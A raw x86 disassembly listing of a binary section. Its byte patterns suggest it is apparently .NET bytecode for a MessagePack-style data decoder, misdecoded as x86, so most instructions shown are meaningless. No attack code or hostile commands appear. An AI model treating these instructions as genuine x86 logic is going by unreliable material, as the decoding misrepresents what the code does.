  404c42:	00 00                	add    %al,(%eax)
  404c44:	14 2a                	adc    $0x2a,%al
  404c46:	07                   	pop    %es
  404c47:	8e 69 17             	mov    0x17(%ecx),%gs
  404c4a:	3e 41                	ds inc %ecx
  404c4c:	00 00                	add    %al,(%eax)
  404c4e:	00 16                	add    %dl,(%esi)
  404c50:	0d 38 32 00 00       	or     $0x3238,%eax
  404c55:	00 07                	add    %al,(%edi)
  404c57:	09 a3 38 00 00 01    	or     %esp,0x1000038(%ebx)
  404c5d:	0c 06                	or     $0x6,%al
  404c5f:	08 6f 6e             	or     %ch,0x6e(%edi)
  404c62:	00 00                	add    %al,(%eax)
  404c64:	06                   	push   %es
  404c65:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404c68:	04 3a                	add    $0x3a,%al
  404c6a:	13 00                	adc    (%eax),%eax
  404c6c:	00 00                	add    %al,(%eax)
  404c6e:	06                   	push   %es
  404c6f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c70:	6f                   	outsl  %ds:(%esi),(%dx)
  404c71:	00 00                	add    %al,(%eax)
  404c73:	06                   	push   %es
  404c74:	0a 06                	or     (%esi),%al
  404c76:	08 6f 6a             	or     %ch,0x6a(%edi)
  404c79:	00 00                	add    %al,(%eax)
  404c7b:	06                   	push   %es
  404c7c:	38 03                	cmp    %al,(%ebx)
  404c7e:	00 00                	add    %al,(%eax)
  404c80:	00 11                	add    %dl,(%ecx)
  404c82:	04 0a                	add    $0xa,%al
  404c84:	09 17                	or     %edx,(%edi)
  404c86:	58                   	pop    %eax
  404c87:	0d 09 07 8e 69       	or     $0x698e0709,%eax
  404c8c:	17                   	pop    %ss
  404c8d:	59                   	pop    %ecx
  404c8e:	32 c6                	xor    %dh,%al
  404c90:	07                   	pop    %es
  404c91:	07                   	pop    %es
  404c92:	8e 69 17             	mov    0x17(%ecx),%gs
  404c95:	59                   	pop    %ecx
  404c96:	a3 38 00 00 01       	mov    %eax,0x1000038
  404c9b:	0c 06                	or     $0x6,%al
  404c9d:	08 6f 6d             	or     %ch,0x6d(%edi)
  404ca0:	00 00                	add    %al,(%eax)
  404ca2:	06                   	push   %es
  404ca3:	13 05 11 05 15 3e    	adc    0x3e150511,%eax
  404ca9:	0e                   	push   %cs
  404caa:	00 00                	add    %al,(%eax)
  404cac:	00 06                	add    %al,(%esi)
  404cae:	7b 38                	jnp    0x404ce8
  404cb0:	00 00                	add    %al,(%eax)
  404cb2:	04 11                	add    $0x11,%al
  404cb4:	05 6f ea 00 00       	add    $0xea6f,%eax
  404cb9:	0a 2a                	or     (%edx),%ch
  404cbb:	06                   	push   %es
  404cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbd:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbe:	00 00                	add    %al,(%eax)
  404cc0:	06                   	push   %es
  404cc1:	0a 06                	or     (%esi),%al
  404cc3:	08 6f 6a             	or     %ch,0x6a(%edi)
  404cc6:	00 00                	add    %al,(%eax)
  404cc8:	06                   	push   %es
  404cc9:	06                   	push   %es
  404cca:	2a 00                	sub    (%eax),%al
  404ccc:	1b 30                	sbb    (%eax),%esi
  404cce:	04 00                	add    $0x0,%al
  404cd0:	3b 00                	cmp    (%eax),%eax
  404cd2:	00 00                	add    %al,(%eax)
  404cd4:	24 00                	and    $0x0,%al
  404cd6:	00 11                	add    %dl,(%ecx)
  404cd8:	73 d0                	jae    0x404caa
  404cda:	00 00                	add    %al,(%eax)
  404cdc:	0a 0a                	or     (%edx),%cl
  404cde:	03 28                	add    (%eax),%ebp
  404ce0:	a2 00 00 06 10       	mov    %al,0x10060000
  404ce5:	01 06                	add    %eax,(%esi)
  404ce7:	03 16                	add    (%esi),%edx
  404ce9:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404cef:	00 0a                	add    %cl,(%edx)
  404cf1:	06                   	push   %es
  404cf2:	16                   	push   %ss
  404cf3:	6a 6f                	push   $0x6f
  404cf5:	4e                   	dec    %esi
  404cf6:	00 00                	add    %al,(%eax)
  404cf8:	0a 02                	or     (%edx),%al
  404cfa:	06                   	push   %es
  404cfb:	28 88 00 00 06 dd    	sub    %cl,-0x22fa0000(%eax)
  404d01:	0d 00 00 00 06       	or     $0x6000000,%eax
  404d06:	39 06                	cmp    %eax,(%esi)
  404d08:	00 00                	add    %al,(%eax)
  404d0a:	00 06                	add    %al,(%esi)
  404d0c:	6f                   	outsl  %ds:(%esi),(%dx)
  404d0d:	33 00                	xor    (%eax),%eax
  404d0f:	00 0a                	add    %cl,(%edx)
  404d11:	dc 2a                	fsubrl (%edx)
  404d13:	00 01                	add    %al,(%ecx)
  404d15:	10 00                	adc    %al,(%eax)
  404d17:	00 02                	add    %al,(%edx)
  404d19:	00 06                	add    %al,(%esi)
  404d1b:	00 27                	add    %ah,(%edi)
  404d1d:	2d 00 0d 00 00       	sub    $0xd00,%eax
  404d22:	00 00                	add    %al,(%eax)
  404d24:	13 30                	adc    (%eax),%esi
  404d26:	02 00                	add    (%eax),%al
  404d28:	16                   	push   %ss
  404d29:	00 00                	add    %al,(%eax)
  404d2b:	00 25 00 00 11 03    	add    %ah,0x3110000
  404d31:	19 73 6c             	sbb    %esi,0x6c(%ebx)
  404d34:	00 00                	add    %al,(%eax)
  404d36:	0a 0a                	or     (%edx),%cl
  404d38:	02 06                	add    (%esi),%al
  404d3a:	28 88 00 00 06 06    	sub    %cl,0x6060000(%eax)
  404d40:	6f                   	outsl  %ds:(%esi),(%dx)
  404d41:	40                   	inc    %eax
  404d42:	00 00                	add    %al,(%eax)
  404d44:	0a 2a                	or     (%edx),%ch
  404d46:	00 00                	add    %al,(%eax)
  404d48:	13 30                	adc    (%eax),%esi
  404d4a:	04 00                	add    $0x0,%al
  404d4c:	07                   	pop    %es
  404d4d:	06                   	push   %es
  404d4e:	00 00                	add    %al,(%eax)
  404d50:	26 00 00             	add    %al,%es:(%eax)
  404d53:	11 03                	adc    %eax,(%ebx)
  404d55:	6f                   	outsl  %ds:(%esi),(%dx)
  404d56:	00 01                	add    %al,(%ecx)
  404d58:	00 0a                	add    %cl,(%edx)
  404d5a:	d2 0a                	rorb   %cl,(%edx)
  404d5c:	14 0b                	adc    $0xb,%al
  404d5e:	16                   	push   %ss
  404d5f:	0c 16                	or     $0x16,%al
  404d61:	0d 06 1f 7f 3d       	or     $0x3d7f1f06,%eax
  404d66:	09 00                	or     %eax,(%eax)
  404d68:	00 00                	add    %al,(%eax)
  404d6a:	02 06                	add    (%esi),%al
  404d6c:	6e                   	outsb  %ds:(%esi),(%dx)
  404d6d:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  404d71:	06                   	push   %es
  404d72:	2a 06                	sub    (%esi),%al
  404d74:	20 80 00 00 00 3f    	and    %al,0x3f000000(%eax)
  404d7a:	48                   	dec    %eax
  404d7b:	00 00                	add    %al,(%eax)
  404d7d:	00 06                	add    %al,(%esi)
  404d7f:	20 8f 00 00 00 3d    	and    %cl,0x3d000000(%edi)
  404d85:	3d 00 00 00 02       	cmp    $0x2000000,%eax
  404d8a:	28 6b 00             	sub    %ch,0x0(%ebx)
  404d8d:	00 06                	add    %al,(%esi)
  404d8f:	02 18                	add    (%eax),%bl
  404d91:	7d 36                	jge    0x404dc9
  404d93:	00 00                	add    %al,(%eax)
  404d95:	04 06                	add    $0x6,%al
  404d97:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  404d9d:	0c 16                	or     $0x16,%al
  404d9f:	0d 38 1c 00 00       	or     $0x1c38,%eax
  404da4:	00 02                	add    %al,(%edx)
  404da6:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404daa:	06                   	push   %es
  404dab:	25 03 28 96 00       	and    $0x962803,%eax
  404db0:	00 06                	add    %al,(%esi)
  404db2:	6f                   	outsl  %ds:(%esi),(%dx)
  404db3:	6a 00                	push   $0x0
  404db5:	00 06                	add    %al,(%esi)
  404db7:	03 6f 88             	add    -0x78(%edi),%ebp
  404dba:	00 00                	add    %al,(%eax)
  404dbc:	06                   	push   %es
  404dbd:	09 17                	or     %edx,(%edi)
  404dbf:	58                   	pop    %eax
  404dc0:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  404dc5:	2a 06                	sub    (%esi),%al
  404dc7:	20 90 00 00 00 3f    	and    %dl,0x3f000000(%eax)
  404dcd:	3c 00                	cmp    $0x0,%al
  404dcf:	00 00                	add    %al,(%eax)
  404dd1:	06                   	push   %es
  404dd2:	20 9f 00 00 00 3d    	and    %bl,0x3d000000(%edi)
  404dd8:	31 00                	xor    %eax,(%eax)
  404dda:	00 00                	add    %al,(%eax)
  404ddc:	02 28                	add    (%eax),%ch
  404dde:	6b 00 00             	imul   $0x0,(%eax),%eax
  404de1:	06                   	push   %es
  404de2:	02 19                	add    (%ecx),%bl
  404de4:	7d 36                	jge    0x404e1c
  404de6:	00 00                	add    %al,(%eax)
  404de8:	04 06                	add    $0x6,%al
  404dea:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  404df0:	0c 16                	or     $0x16,%al
  404df2:	0d 38 10 00 00       	or     $0x1038,%eax
  404df7:	00 02                	add    %al,(%edx)
  404df9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404dfd:	06                   	push   %es
  404dfe:	03 6f 88             	add    -0x78(%edi),%ebp
  404e01:	00 00                	add    %al,(%eax)
  404e03:	06                   	push   %es
  404e04:	09 17                	or     %edx,(%edi)
  404e06:	58                   	pop    %eax
  404e07:	0d 09 08 32 ec       	or     $0xec320809,%eax
  404e0c:	2a 06                	sub    (%esi),%al
  404e0e:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  404e14:	21 00                	and    %eax,(%eax)
  404e16:	00 00                	add    %al,(%eax)
  404e18:	06                   	push   %es
  404e19:	20 bf 00 00 00 3d    	and    %bh,0x3d000000(%edi)
  404e1f:	16                   	push   %ss
  404e20:	00 00                	add    %al,(%eax)
  404e22:	00 06                	add    %al,(%esi)
  404e24:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  404e2a:	0c 02                	or     $0x2,%al
  404e2c:	03 08                	add    (%eax),%ecx
  404e2e:	28 95 00 00 06 28    	sub    %dl,0x28060000(%ebp)
  404e34:	81 00 00 06 2a 06    	addl   $0x62a0600,(%eax)
  404e3a:	20 e0                	and    %ah,%al
  404e3c:	00 00                	add    %al,(%eax)
  404e3e:	00 3f                	add    %bh,(%edi)
  404e40:	15 00 00 00 06       	adc    $0x6000000,%eax
  404e45:	20 ff                	and    %bh,%bh
  404e47:	00 00                	add    %al,(%eax)
  404e49:	00 3d 0a 00 00 00    	add    %bh,0xa
  404e4f:	02 06                	add    (%esi),%al
  404e51:	67 6a 28             	addr16 push $0x28
  404e54:	74 00                	je     0x404e56
  404e56:	00 06                	add    %al,(%esi)
  404e58:	2a 06                	sub    (%esi),%al
  404e5a:	20 c0                	and    %al,%al
  404e5c:	00 00                	add    %al,(%eax)
  404e5e:	00 40 07             	add    %al,0x7(%eax)
  404e61:	00 00                	add    %al,(%eax)
  404e63:	00 02                	add    %al,(%edx)
  404e65:	28 80 00 00 06 2a    	sub    %al,0x2a060000(%eax)
  404e6b:	06                   	push   %es
  404e6c:	20 c1                	and    %al,%cl
  404e6e:	00 00                	add    %al,(%eax)
  404e70:	00 40 0b             	add    %al,0xb(%eax)
  404e73:	00 00                	add    %al,(%eax)
  404e75:	00 72 12             	add    %dh,0x12(%edx)
  404e78:	28 00                	sub    %al,(%eax)
  404e7a:	70 73                	jo     0x404eef
  404e7c:	01 01                	add    %eax,(%ecx)
  404e7e:	00 0a                	add    %cl,(%edx)
  404e80:	7a 06                	jp     0x404e88
  404e82:	20 c2                	and    %al,%dl
  404e84:	00 00                	add    %al,(%eax)
  404e86:	00 40 08             	add    %al,0x8(%eax)
  404e89:	00 00                	add    %al,(%eax)
  404e8b:	00 02                	add    %al,(%edx)
  404e8d:	16                   	push   %ss
  404e8e:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404e94:	06                   	push   %es
  404e95:	20 c3                	and    %al,%bl
  404e97:	00 00                	add    %al,(%eax)
  404e99:	00 40 08             	add    %al,0x8(%eax)
  404e9c:	00 00                	add    %al,(%eax)
  404e9e:	00 02                	add    %al,(%edx)
  404ea0:	17                   	pop    %ss
  404ea1:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404ea7:	06                   	push   %es
  404ea8:	20 c4                	and    %al,%ah
  404eaa:	00 00                	add    %al,(%eax)
  404eac:	00 40 20             	add    %al,0x20(%eax)
  404eaf:	00 00                	add    %al,(%eax)
  404eb1:	00 03                	add    %al,(%ebx)
  404eb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404eb4:	00 01                	add    %al,(%ecx)
  404eb6:	00 0a                	add    %cl,(%edx)
  404eb8:	0c 08                	or     $0x8,%al
  404eba:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ebe:	01 0b                	add    %ecx,(%ebx)
  404ec0:	03 07                	add    (%edi),%eax
  404ec2:	16                   	push   %ss
  404ec3:	08 6f 45             	or     %ch,0x45(%edi)
  404ec6:	00 00                	add    %al,(%eax)
  404ec8:	0a 26                	or     (%esi),%ah
  404eca:	02 07                	add    (%edi),%al
  404ecc:	28 79 00             	sub    %bh,0x0(%ecx)
  404ecf:	00 06                	add    %al,(%esi)
  404ed1:	2a 06                	sub    (%esi),%al
  404ed3:	20 c5                	and    %al,%ch
  404ed5:	00 00                	add    %al,(%eax)
  404ed7:	00 40 39             	add    %al,0x39(%eax)
  404eda:	00 00                	add    %al,(%eax)
  404edc:	00 18                	add    %bl,(%eax)
  404ede:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ee2:	01 0b                	add    %ecx,(%ebx)
  404ee4:	03 07                	add    (%edi),%eax
  404ee6:	16                   	push   %ss
  404ee7:	18 6f 45             	sbb    %ch,0x45(%edi)
  404eea:	00 00                	add    %al,(%eax)
  404eec:	0a 26                	or     (%esi),%ah
  404eee:	07                   	pop    %es
  404eef:	28 58 00             	sub    %bl,0x0(%eax)
  404ef2:	00 06                	add    %al,(%esi)
  404ef4:	0b 07                	or     (%edi),%eax
  404ef6:	16                   	push   %ss
  404ef7:	28 02                	sub    %al,(%edx)
  404ef9:	01 00                	add    %eax,(%eax)
  404efb:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404efe:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f02:	01 0b                	add    %ecx,(%ebx)
  404f04:	03 07                	add    (%edi),%eax
  404f06:	16                   	push   %ss
  404f07:	08 6f 45             	or     %ch,0x45(%edi)
  404f0a:	00 00                	add    %al,(%eax)
  404f0c:	0a 26                	or     (%esi),%ah
  404f0e:	02 07                	add    (%edi),%al
  404f10:	28 79 00             	sub    %bh,0x0(%ecx)
  404f13:	00 06                	add    %al,(%esi)
  404f15:	2a 06                	sub    (%esi),%al
  404f17:	20 c6                	and    %al,%dh
  404f19:	00 00                	add    %al,(%eax)
  404f1b:	00 40 39             	add    %al,0x39(%eax)
  404f1e:	00 00                	add    %al,(%eax)
  404f20:	00 1a                	add    %bl,(%edx)
  404f22:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f26:	01 0b                	add    %ecx,(%ebx)
  404f28:	03 07                	add    (%edi),%eax
  404f2a:	16                   	push   %ss
  404f2b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f2e:	00 00                	add    %al,(%eax)
  404f30:	0a 26                	or     (%esi),%ah
  404f32:	07                   	pop    %es
  404f33:	28 58 00             	sub    %bl,0x0(%eax)
  404f36:	00 06                	add    %al,(%esi)
  404f38:	0b 07                	or     (%edi),%eax
  404f3a:	16                   	push   %ss
  404f3b:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  404f3f:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404f42:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f46:	01 0b                	add    %ecx,(%ebx)
  404f48:	03 07                	add    (%edi),%eax
  404f4a:	16                   	push   %ss
  404f4b:	08 6f 45             	or     %ch,0x45(%edi)
  404f4e:	00 00                	add    %al,(%eax)
  404f50:	0a 26                	or     (%esi),%ah
  404f52:	02 07                	add    (%edi),%al
  404f54:	28 79 00             	sub    %bh,0x0(%ecx)
  404f57:	00 06                	add    %al,(%esi)
  404f59:	2a 06                	sub    (%esi),%al
  404f5b:	20 c7                	and    %al,%bh
  404f5d:	00 00                	add    %al,(%eax)
  404f5f:	00 3b                	add    %bh,(%ebx)
  404f61:	16                   	push   %ss
  404f62:	00 00                	add    %al,(%eax)
  404f64:	00 06                	add    %al,(%esi)
  404f66:	20 c8                	and    %cl,%al
  404f68:	00 00                	add    %al,(%eax)
  404f6a:	00 3b                	add    %bh,(%ebx)
  404f6c:	0b 00                	or     (%eax),%eax
  404f6e:	00 00                	add    %al,(%eax)
  404f70:	06                   	push   %es
  404f71:	20 c9                	and    %cl,%cl
  404f73:	00 00                	add    %al,(%eax)
  404f75:	00 40 0b             	add    %al,0xb(%eax)
  404f78:	00 00                	add    %al,(%eax)
  404f7a:	00 72 3e             	add    %dh,0x3e(%edx)
  404f7d:	28 00                	sub    %al,(%eax)
  404f7f:	70 73                	jo     0x404ff4
  404f81:	01 01                	add    %eax,(%ecx)
  404f83:	00 0a                	add    %cl,(%edx)
  404f85:	7a 06                	jp     0x404f8d
  404f87:	20 ca                	and    %cl,%dl
  404f89:	00 00                	add    %al,(%eax)
  404f8b:	00 40 26             	add    %al,0x26(%eax)
  404f8e:	00 00                	add    %al,(%eax)
  404f90:	00 1a                	add    %bl,(%edx)
  404f92:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f96:	01 0b                	add    %ecx,(%ebx)
  404f98:	03 07                	add    (%edi),%eax
  404f9a:	16                   	push   %ss
  404f9b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f9e:	00 00                	add    %al,(%eax)
  404fa0:	0a 26                	or     (%esi),%ah
  404fa2:	07                   	pop    %es
  404fa3:	28 58 00             	sub    %bl,0x0(%eax)
  404fa6:	00 06                	add    %al,(%esi)
  404fa8:	0b 02                	or     (%edx),%eax
  404faa:	07                   	pop    %es
  404fab:	16                   	push   %ss
  404fac:	28 03                	sub    %al,(%ebx)
  404fae:	01 00                	add    %eax,(%eax)
  404fb0:	0a 28                	or     (%eax),%ch
  404fb2:	84 00                	test   %al,(%eax)
  404fb4:	00 06                	add    %al,(%esi)
  404fb6:	2a 06                	sub    (%esi),%al
  404fb8:	20 cb                	and    %cl,%bl
  404fba:	00 00                	add    %al,(%eax)
  404fbc:	00 40 26             	add    %al,0x26(%eax)
  404fbf:	00 00                	add    %al,(%eax)
  404fc1:	00 1e                	add    %bl,(%esi)
  404fc3:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404fc7:	01 0b                	add    %ecx,(%ebx)
  404fc9:	03 07                	add    (%edi),%eax
  404fcb:	16                   	push   %ss
  404fcc:	1e                   	push   %ds
  404fcd:	6f                   	outsl  %ds:(%esi),(%dx)
  404fce:	45                   	inc    %ebp
  404fcf:	00 00                	add    %al,(%eax)
  404fd1:	0a 26                	or     (%esi),%ah
  404fd3:	07                   	pop    %es
  404fd4:	28 58 00             	sub    %bl,0x0(%eax)
  404fd7:	00 06                	add    %al,(%esi)
  404fd9:	0b 02                	or     (%edx),%eax
  404fdb:	07                   	pop    %es
  404fdc:	16                   	push   %ss
  404fdd:	28 04 01             	sub    %al,(%ecx,%eax,1)
  404fe0:	00 0a                	add    %cl,(%edx)
  404fe2:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  404fe8:	06                   	push   %es
  404fe9:	20 cc                	and    %cl,%ah
  404feb:	00 00                	add    %al,(%eax)
  404fed:	00 40 11             	add    %al,0x11(%eax)
  404ff0:	00 00                	add    %al,(%eax)
  404ff2:	00 03                	add    %al,(%ebx)
  404ff4:	6f                   	outsl  %ds:(%esi),(%dx)
  404ff5:	00 01                	add    %al,(%ecx)
  404ff7:	00 0a                	add    %cl,(%edx)
  404ff9:	d2 0a                	rorb   %cl,(%edx)
  404ffb:	02 06                	add    (%esi),%al
  404ffd:	6e                   	outsb  %ds:(%esi),(%dx)
  404ffe:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405002:	06                   	push   %es
  405003:	2a 06                	sub    (%esi),%al
  405005:	20 cd                	and    %cl,%ch
  405007:	00 00                	add    %al,(%eax)
  405009:	00 40 27             	add    %al,0x27(%eax)
  40500c:	00 00                	add    %al,(%eax)
  40500e:	00 18                	add    %bl,(%eax)
  405010:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405014:	01 0b                	add    %ecx,(%ebx)
  405016:	03 07                	add    (%edi),%eax
  405018:	16                   	push   %ss
  405019:	18 6f 45             	sbb    %ch,0x45(%edi)
  40501c:	00 00                	add    %al,(%eax)
  40501e:	0a 26                	or     (%esi),%ah
  405020:	07                   	pop    %es
  405021:	28 58 00             	sub    %bl,0x0(%eax)
  405024:	00 06                	add    %al,(%esi)
  405026:	0b 02                	or     (%edx),%eax
  405028:	07                   	pop    %es
  405029:	16                   	push   %ss
  40502a:	28 02                	sub    %al,(%edx)
  40502c:	01 00                	add    %eax,(%eax)
  40502e:	0a 6e 28             	or     0x28(%esi),%ch
  405031:	74 00                	je     0x405033
  405033:	00 06                	add    %al,(%esi)
  405035:	2a 06                	sub    (%esi),%al
  405037:	20 ce                	and    %cl,%dh
  405039:	00 00                	add    %al,(%eax)
  40503b:	00 40 27             	add    %al,0x27(%eax)
  40503e:	00 00                	add    %al,(%eax)
  405040:	00 1a                	add    %bl,(%edx)
  405042:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405046:	01 0b                	add    %ecx,(%ebx)
  405048:	03 07                	add    (%edi),%eax
  40504a:	16                   	push   %ss
  40504b:	1a 6f 45             	sbb    0x45(%edi),%ch
  40504e:	00 00                	add    %al,(%eax)
  405050:	0a 26                	or     (%esi),%ah
  405052:	07                   	pop    %es
  405053:	28 58 00             	sub    %bl,0x0(%eax)
  405056:	00 06                	add    %al,(%esi)
  405058:	0b 02                	or     (%edx),%eax
  40505a:	07                   	pop    %es
  40505b:	16                   	push   %ss
  40505c:	28 05 01 00 0a 6e    	sub    %al,0x6e0a0001
  405062:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405066:	06                   	push   %es
  405067:	2a 06                	sub    (%esi),%al
  405069:	20 cf                	and    %cl,%bh
  40506b:	00 00                	add    %al,(%eax)
  40506d:	00 40 26             	add    %al,0x26(%eax)
  405070:	00 00                	add    %al,(%eax)
  405072:	00 1e                	add    %bl,(%esi)
  405074:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405078:	01 0b                	add    %ecx,(%ebx)
  40507a:	03 07                	add    (%edi),%eax
  40507c:	16                   	push   %ss
  40507d:	1e                   	push   %ds
  40507e:	6f                   	outsl  %ds:(%esi),(%dx)
  40507f:	45                   	inc    %ebp
  405080:	00 00                	add    %al,(%eax)
  405082:	0a 26                	or     (%esi),%ah
  405084:	07                   	pop    %es
  405085:	28 58 00             	sub    %bl,0x0(%eax)
  405088:	00 06                	add    %al,(%esi)
  40508a:	0b 02                	or     (%edx),%eax
  40508c:	07                   	pop    %es
  40508d:	16                   	push   %ss
  40508e:	28 06                	sub    %al,(%esi)
  405090:	01 00                	add    %eax,(%eax)
  405092:	0a 28                	or     (%eax),%ch
  405094:	75 00                	jne    0x405096
  405096:	00 06                	add    %al,(%esi)
  405098:	2a 06                	sub    (%esi),%al
  40509a:	20 dc                	and    %bl,%ah
  40509c:	00 00                	add    %al,(%eax)
  40509e:	00 40 49             	add    %al,0x49(%eax)
  4050a1:	00 00                	add    %al,(%eax)
  4050a3:	00 18                	add    %bl,(%eax)
  4050a5:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050a9:	01 0b                	add    %ecx,(%ebx)
  4050ab:	03 07                	add    (%edi),%eax
  4050ad:	16                   	push   %ss
  4050ae:	18 6f 45             	sbb    %ch,0x45(%edi)
  4050b1:	00 00                	add    %al,(%eax)
  4050b3:	0a 26                	or     (%esi),%ah
  4050b5:	07                   	pop    %es
  4050b6:	28 58 00             	sub    %bl,0x0(%eax)
  4050b9:	00 06                	add    %al,(%esi)
  4050bb:	0b 07                	or     (%edi),%eax
  4050bd:	16                   	push   %ss
  4050be:	28 07                	sub    %al,(%edi)
  4050c0:	01 00                	add    %eax,(%eax)
  4050c2:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4050c5:	28 6b 00             	sub    %ch,0x0(%ebx)
  4050c8:	00 06                	add    %al,(%esi)
  4050ca:	02 19                	add    (%ecx),%bl
  4050cc:	7d 36                	jge    0x405104
  4050ce:	00 00                	add    %al,(%eax)
  4050d0:	04 16                	add    $0x16,%al
  4050d2:	0d 38 10 00 00       	or     $0x1038,%eax
  4050d7:	00 02                	add    %al,(%edx)
  4050d9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4050dd:	06                   	push   %es
  4050de:	03 6f 88             	add    -0x78(%edi),%ebp
  4050e1:	00 00                	add    %al,(%eax)
  4050e3:	06                   	push   %es
  4050e4:	09 17                	or     %edx,(%edi)
  4050e6:	58                   	pop    %eax
  4050e7:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4050ec:	2a 06                	sub    (%esi),%al
  4050ee:	20 dd                	and    %bl,%ch
  4050f0:	00 00                	add    %al,(%eax)
  4050f2:	00 40 49             	add    %al,0x49(%eax)
  4050f5:	00 00                	add    %al,(%eax)
  4050f7:	00 1a                	add    %bl,(%edx)
  4050f9:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050fd:	01 0b                	add    %ecx,(%ebx)
  4050ff:	03 07                	add    (%edi),%eax
  405101:	16                   	push   %ss
  405102:	1a 6f 45             	sbb    0x45(%edi),%ch
  405105:	00 00                	add    %al,(%eax)
  405107:	0a 26                	or     (%esi),%ah
  405109:	07                   	pop    %es
  40510a:	28 58 00             	sub    %bl,0x0(%eax)
  40510d:	00 06                	add    %al,(%esi)
  40510f:	0b 07                	or     (%edi),%eax
  405111:	16                   	push   %ss
  405112:	28 07                	sub    %al,(%edi)
  405114:	01 00                	add    %eax,(%eax)
  405116:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405119:	28 6b 00             	sub    %ch,0x0(%ebx)
  40511c:	00 06                	add    %al,(%esi)
  40511e:	02 19                	add    (%ecx),%bl
  405120:	7d 36                	jge    0x405158
  405122:	00 00                	add    %al,(%eax)
  405124:	04 16                	add    $0x16,%al
  405126:	0d 38 10 00 00       	or     $0x1038,%eax
  40512b:	00 02                	add    %al,(%edx)
  40512d:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405131:	06                   	push   %es
  405132:	03 6f 88             	add    -0x78(%edi),%ebp
  405135:	00 00                	add    %al,(%eax)
  405137:	06                   	push   %es
  405138:	09 17                	or     %edx,(%edi)
  40513a:	58                   	pop    %eax
  40513b:	0d 09 08 32 ec       	or     $0xec320809,%eax
  405140:	2a 06                	sub    (%esi),%al
  405142:	20 d9                	and    %bl,%cl
  405144:	00 00                	add    %al,(%eax)
  405146:	00 40 0e             	add    %al,0xe(%eax)
  405149:	00 00                	add    %al,(%eax)
  40514b:	00 02                	add    %al,(%edx)
  40514d:	06                   	push   %es
  40514e:	03 28                	add    (%eax),%ebp
  405150:	97                   	xchg   %eax,%edi
  405151:	00 00                	add    %al,(%eax)
  405153:	06                   	push   %es
  405154:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  40515a:	06                   	push   %es
  40515b:	20 de                	and    %bl,%dh
  40515d:	00 00                	add    %al,(%eax)
  40515f:	00 40 55             	add    %al,0x55(%eax)
  405162:	00 00                	add    %al,(%eax)
  405164:	00 18                	add    %bl,(%eax)
  405166:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40516a:	01 0b                	add    %ecx,(%ebx)
  40516c:	03 07                	add    (%edi),%eax
  40516e:	16                   	push   %ss
  40516f:	18 6f 45             	sbb    %ch,0x45(%edi)
  405172:	00 00                	add    %al,(%eax)
  405174:	0a 26                	or     (%esi),%ah
  405176:	07                   	pop    %es
  405177:	28 58 00             	sub    %bl,0x0(%eax)
  40517a:	00 06                	add    %al,(%esi)
  40517c:	0b 07                	or     (%edi),%eax
  40517e:	16                   	push   %ss
  40517f:	28 07                	sub    %al,(%edi)
  405181:	01 00                	add    %eax,(%eax)
  405183:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405186:	28 6b 00             	sub    %ch,0x0(%ebx)
  405189:	00 06                	add    %al,(%esi)
  40518b:	02 18                	add    (%eax),%bl
  40518d:	7d 36                	jge    0x4051c5
  40518f:	00 00                	add    %al,(%eax)
  405191:	04 16                	add    $0x16,%al
  405193:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405198:	00 02                	add    %al,(%edx)
  40519a:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40519e:	06                   	push   %es
  40519f:	25 03 28 96 00       	and    $0x962803,%eax
  4051a4:	00 06                	add    %al,(%esi)
  4051a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4051a7:	6a 00                	push   $0x0
  4051a9:	00 06                	add    %al,(%esi)
  4051ab:	03 6f 88             	add    -0x78(%edi),%ebp
  4051ae:	00 00                	add    %al,(%eax)
  4051b0:	06                   	push   %es
  4051b1:	09 17                	or     %edx,(%edi)
  4051b3:	58                   	pop    %eax
  4051b4:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  4051b9:	2a 06                	sub    (%esi),%al
  4051bb:	20 de                	and    %bl,%dh
  4051bd:	00 00                	add    %al,(%eax)
